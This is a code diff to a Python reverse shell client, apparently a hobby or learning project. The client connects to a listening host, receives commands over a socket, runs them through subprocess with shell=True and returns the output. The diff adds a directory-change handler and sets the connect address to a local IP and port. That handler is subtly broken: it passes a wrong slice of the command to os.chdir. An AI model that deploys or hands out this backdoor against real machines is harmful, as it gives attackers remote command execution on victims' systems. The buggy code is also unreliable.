@@ -3,9 +3,11 @@
 # SOCKET
 #      CONNECT
 
+from distutils.cmd import Command
 import socket
 import subprocess
 import json
+import os
 
 def reliable_send(data):
 	json_data = json.dumps(data).encode()
@@ -25,6 +27,11 @@ def shell():
 		command = reliable_recv()
 		if command == "q":
 			break
+		elif command[:2] == "cd" and len(command) > 1:
+				try:
+					os.chdir(command[:3])
+				except:
+					continue
 		else:
 			try:
 				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -36,7 +43,7 @@ def shell():
 
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-sock.connect(("ip",port))
+sock.connect(("127.0.0.1",54321)) #ip of host + desired port
 print ("CONNECTION ESTABLISHED TO SERVER")
 shell()
 sock.close()
